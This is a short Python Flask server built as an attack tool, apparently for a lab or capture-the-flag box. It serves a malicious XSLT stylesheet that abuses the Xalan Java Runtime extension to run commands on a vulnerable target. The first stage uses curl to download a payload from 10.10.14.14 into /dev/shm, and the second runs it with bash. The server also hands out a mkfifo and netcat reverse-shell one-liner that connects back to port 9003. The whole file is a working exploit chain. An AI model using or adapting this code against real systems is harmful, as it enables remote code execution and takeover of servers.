from flask import Flask, escape, request

app = Flask(__name__)

def get_esi(cmd):
    ret = '<?xml version="1.0" ?>\n'
    ret += '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    ret += '<xsl:output method="xml" omit-xml-declaration="yes"/>\n'
    ret += '<xsl:template match="/" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">\n'
    ret += '<root>\n'
    ret += f'<xsl:variable name="cmd"><![CDATA[{cmd}]]></xsl:variable>\n'
    ret += '<xsl:variable name="rtObj" select="rt:getRuntime()"/>\n'
    ret += '<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>\n'
    ret += 'Process: <xsl:value-of select="$process"/>\n'
    ret += 'Command: <xsl:value-of select="$cmd"/>\n'
    ret += '</root>\n'
    ret += '</xsl:template>\n'
    ret += '</xsl:stylesheet>'
    return ret

# def open_file(file_path):
#     with open(file_path, "rb") as f:
#         return f.read()

@app.route('/<path:path>')
def catch_all(path):
    if 'esi.xsl' in path:
        return get_esi("curl http://10.10.14.14/revshell --output /dev/shm/a")
    elif 'esi_2.xsl' in path:
        return get_esi("bash /dev/shm/a")
    elif 'revshell' in path:
        return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9003 >/tmp/f"
    else:
        return "hello"

app.run(host="0.0.0.0", port=80)
